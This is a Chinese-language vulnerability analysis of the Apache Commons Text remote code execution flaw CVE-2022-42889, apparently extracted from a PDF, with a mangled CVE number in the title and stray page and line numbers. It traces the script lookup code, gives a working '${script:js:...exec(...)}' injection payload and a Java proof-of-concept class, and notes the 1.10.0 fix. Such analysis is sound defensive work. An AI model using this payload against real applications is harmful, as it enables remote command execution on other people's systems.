1
Apache Commons Text RCE(CVE-OLOO-
QOWWX)
漏洞分析
漏洞复现
漏洞防御
漏洞详细：https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om 
根据⽂中提到的 lookups 可以定位到 InterpolatorStringLookup#lookup ⽅法 
漏洞分析
2
第5⾏将  : 的第⼀次出现的下标赋给 prefixPos，如果 prefixPos ⼤于 0，则会将  : 前半部分赋给 
prefix(此处会进⾏⼩写处理)，后半部分赋给 name。 
接着在 stringLookupMap 查看是否存在对应的键名，如果存在则会调⽤ StringLookup#lookup ⽅法 
这些 lookups 可以在 org.apache.commons.text.lookup.DefaultStringLookup 中查看 
public String lookup(String var) {
    if (var == null) {
        return null;
    } else {
        int prefixPos = var.indexOf(58);
        if (prefixPos >= 0) {
            String prefix = toKey(var.substring(0, prefixPos));
            String name = var.substring(prefixPos + 1);
            StringLookup lookup = (StringLookup)this.stringLookupMap.get(p
refix);
            String value = null;
            if (lookup != null) {
                value = lookup.lookup(name);
            }
            if (value != null) {
                return value;
            }
            var = var.substring(prefixPos + 1);
        }
        return this.defaultStringLookup != null ? this.defaultStringLookup
.lookup(var) : null;
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
Java
复制代码
3
⽂中说明可以使⽤ script 进⾏命令执⾏，查看 ScriptStringLookup#lookup ⽅法 
4
SPLIT_STR 为  : ，将其再划分为两部分。接着会将这两部分分别赋给 engineName 和 script，其中 
engineName 是在  (new ScriptEngineManager()).getEngineByName(engineName) 进⾏调
⽤的，这⾥ engineName 是赋值 js，然后 script 是在  scriptEngine.eval(script) 进⾏调⽤代码
执⾏，这⾥可以使⽤ java.lang.Runtime.getRuntime().exec(\"calc\") ，最后 Payload 如
下
其他 lookup 可⾃⾏分析利⽤ 
public String lookup(String key) {
    if (key == null) {
        return null;
    } else {
        String[] keys = key.split(SPLIT_STR, 2);
        int keyLen = keys.length;
        if (keyLen != 2) {
            throw IllegalArgumentExceptions.format("Bad script key format 
[%s]; expected format is EngineName:Script.", new Object[]{key});
        } else {
            String engineName = keys[0];
            String script = keys[1];
            try {
                ScriptEngine scriptEngine = (new ScriptEngineManager()).ge
tEngineByName(engineName);
                if (scriptEngine == null) {
                    throw new IllegalArgumentException("No script engine n
amed " + engineName);
                } else {
                    return Objects.toString(scriptEngine.eval(script), (St
ring)null);
                }
            } catch (Exception var7) {
                throw IllegalArgumentExceptions.format(var7, "Error in scr
ipt engine [%s] evaluating script [%s].", new Object[]{engineName, script}
);
            }
        }
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
Java
复制代码
${script:js:java.lang.Runtime.getRuntime().exec("calc")}
1
Plain Text
复制代码
5
pom.xml 添加如下依赖 
CVE_2022_42889.java 
执⾏截图
漏洞复现
    org.apache.commons
    commons-text
    1.9
1
2
3
4
5
6
Plain Text
复制代码
package cve.test;
import org.apache.commons.text.StringSubstitutor;
public class CVE_2022_42889 {
    public static void main(String[] args) {
        StringSubstitutor interpolator = StringSubstitutor.createInterpola
tor();
        interpolator.replace("${script:js:java.lang.Runtime.getRuntime().e
xec(\"calc\")}");
    }
}
1
2
3
4
5
6
7
8
9
10
11
Java
复制代码
6
官⽅给出的修复⽅案是更新 Apache Commons Text 1.10.0 
定位⾄ org.apache.commons.text.lookup.StringLookupFactory 中的 
DefaultStringLookupsHolder#createDefaultStringLookups 
在创建时就将危险的 lookup 排除在外 
漏洞防御